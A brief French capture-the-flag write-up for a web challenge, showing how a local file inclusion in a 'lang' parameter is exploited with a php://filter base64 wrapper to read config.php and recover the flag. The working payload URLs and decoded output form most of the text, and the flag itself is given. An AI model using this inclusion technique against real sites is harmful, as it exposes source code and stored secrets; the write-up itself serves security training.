## Extproect

J'ai décidé d'utiliser la même méthode que dans le challenge filtre pour ce challenge

```URL
https://extprotect.secu-web.blackfoot.dev/index.php?lang=php://filter/convert.base64-encode/resource=config.php
```
Ici le paramètre lang va nous permettre d'injecter un filtre avec le fichier config.php qui est require d'après le code source

```HTML
 include(php://filter/convert.base64-encode/resource=config.php.php): failed to open stream:
```

On remarque le serveur rajouter automatique le **.php** à la fin du fichier demandé. Du coup on retire le .php et hop

```URL
https://extprotect.secu-web.blackfoot.dev/index.php?lang=php://filter/convert.base64-encode/resource=config
```

```JS
decodedFlag = window.atob(unescape(encodeURIComponent("PD9waHAKICAvLyBDb25ncmF0eiAhIEZMQUcgSVMgWk9CezN2M25fcHIwdF9jNG43X3N0MHBfbTN9Cj8+Cg==")))
```

```PHP
'<?php\n  // Congratz ! FLAG IS ZOB{3v3n_pr0t_c4n7_st0p_m3}\n?>\n'
```
